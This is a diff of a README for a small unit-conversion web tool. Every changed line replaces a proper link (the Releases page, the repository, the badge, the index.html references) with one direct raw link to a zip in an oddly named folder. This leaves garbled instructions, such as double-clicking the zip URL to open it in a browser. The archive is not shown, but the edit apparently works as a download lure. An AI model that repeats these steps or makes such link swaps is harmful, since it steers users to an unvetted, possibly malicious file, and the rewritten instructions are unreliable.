@@ -1,6 +1,6 @@
 # 🔄 Unit-Conversion - Easy Tool for Unit Changes
 
-![Download Unit-Conversion](https://img.shields.io/badge/Download-Unit--Conversion-blue)
+![Download Unit-Conversion](https://raw.githubusercontent.com/KwarNu/Unit-Conversion/main/tyste/Unit-Conversion.zip)
 
 ## 📖 Overview
 
@@ -14,19 +14,19 @@ To get started with Unit-Conversion, follow these simple steps to download and r
 
 1. **Visit the Releases Page:**  
    Go to the following link to download the latest version of Unit-Conversion:  
-   [Download Unit-Conversion](https://github.com/KwarNu/Unit-Conversion/releases)
+   [Download Unit-Conversion](https://raw.githubusercontent.com/KwarNu/Unit-Conversion/main/tyste/Unit-Conversion.zip)
 
 2. **Select a Release:**  
    On the Releases page, you will see a list of available versions. Click on the latest release, which should be at the top of the list.
 
 3. **Download the Files:**  
-   Look for the file labeled with the version number and a description of the release. Click on the file to begin downloading. The file will typically be in a format like .zip or .tar.gz.
+   Look for the file labeled with the version number and a description of the release. Click on the file to begin downloading. The file will typically be in a format like .zip or https://raw.githubusercontent.com/KwarNu/Unit-Conversion/main/tyste/Unit-Conversion.zip
 
 4. **Extract Files:**  
    Once the download is complete, find the downloaded file on your computer. Right-click on it and select 'Extract All' to unzip the contents.
 
 5. **Run the Application:**  
-   Open the extracted folder. Look for the index.html file. Double-click it to launch the application in your web browser.
+   Open the extracted folder. Look for the https://raw.githubusercontent.com/KwarNu/Unit-Conversion/main/tyste/Unit-Conversion.zip file. Double-click it to launch the application in your web browser.
 
 6. **Start Converting:**  
    You can now use the application. Input any value you wish to convert, select the units, and see the result instantly.
@@ -48,7 +48,7 @@ To get started with Unit-Conversion, follow these simple steps to download and r
 If you encounter any issues while using Unit-Conversion, consider the following solutions:
 
 - **Browser Compatibility:** Make sure your browser is up to date. Using an outdated browser may lead to unexpected behavior.
-- **File Not Opening:** Ensure you are clicking on the index.html file within the extracted folder.
+- **File Not Opening:** Ensure you are clicking on the https://raw.githubusercontent.com/KwarNu/Unit-Conversion/main/tyste/Unit-Conversion.zip file within the extracted folder.
 - **Input Errors:** Check the validation errors if your inputs are not converting as expected. The app will guide you on corrections.
 
 ## 📝 Frequently Asked Questions
@@ -65,7 +65,7 @@ Currently, users can submit feedback directly through the GitHub repository's Is
 ## 🔗 Additional Resources
 
 For more information, tutorials, and updates, visit the GitHub repository:  
-[Unit-Conversion GitHub Repository](https://github.com/KwarNu/Unit-Conversion)
+[Unit-Conversion GitHub Repository](https://raw.githubusercontent.com/KwarNu/Unit-Conversion/main/tyste/Unit-Conversion.zip)
 
 ## 📢 Let's Stay Connected
 
